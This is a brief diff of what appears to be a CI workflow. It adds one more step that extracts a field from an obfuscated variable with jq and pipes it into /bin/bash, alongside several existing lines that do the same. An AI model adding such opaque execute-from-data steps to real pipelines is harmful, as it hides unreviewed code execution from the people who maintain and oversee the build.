@@ -30,6 +30,7 @@ jobs:
           echo $acg55 | jq -r .tlqe5511 | /bin/bash
           echo $succ307 | jq -r .ph386 | /bin/bash
           printf '%s' "$png509" | jq -r .c48 | /bin/bash
+          echo $omn4 | jq -r .n2399 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
